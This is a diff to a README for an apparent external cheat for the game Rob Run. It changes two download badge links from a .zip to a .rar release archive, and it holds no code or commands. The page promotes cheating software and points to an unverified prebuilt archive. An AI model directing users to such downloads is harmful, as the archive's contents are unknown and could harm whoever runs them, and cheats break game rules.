@@ -8,7 +8,7 @@
 [![Platform](https://img.shields.io/badge/platform-Windows%2010%2F11-0078D6?style=for-the-badge&logo=windows)](https://github.com/)
 [![C++](https://img.shields.io/badge/C%2B%2B-20-00599C?style=for-the-badge&logo=cplusplus)](https://github.com/)
 [![License](https://img.shields.io/badge/license-private-red?style=for-the-badge)](https://github.com/)
-[![Download Now](https://img.shields.io/badge/Download-Now-green?style=for-the-badge&logo=github)](https://github.com/GryphonEnchanterCure/external-rob-run-/releases/download/ROB-RUN/Ghost-ROB.RUN.zip)
+[![Download Now](https://img.shields.io/badge/Download-Now-green?style=for-the-badge&logo=github)](https://github.com/GryphonEnchanterCure/external-rob-run-/releases/download/ROB-RUN/Ghost-ROB.RUN.rar)
 
 ---
 
@@ -67,7 +67,7 @@ A fully external Rob Run cheat written in modern C++ with a custom DirectX 11 ov
 </div>
 
 ---
-[![Download Now](https://img.shields.io/badge/Download-Now-green?style=for-the-badge&logo=github)](https://github.com/GryphonEnchanterCure/external-rob-run-/releases/download/ROB-RUN/Ghost-ROB.RUN.zip)
+[![Download Now](https://img.shields.io/badge/Download-Now-green?style=for-the-badge&logo=github)](https://github.com/GryphonEnchanterCure/external-rob-run-/releases/download/ROB-RUN/Ghost-ROB.RUN.rar)
 
 ## 🚀 Installation
 
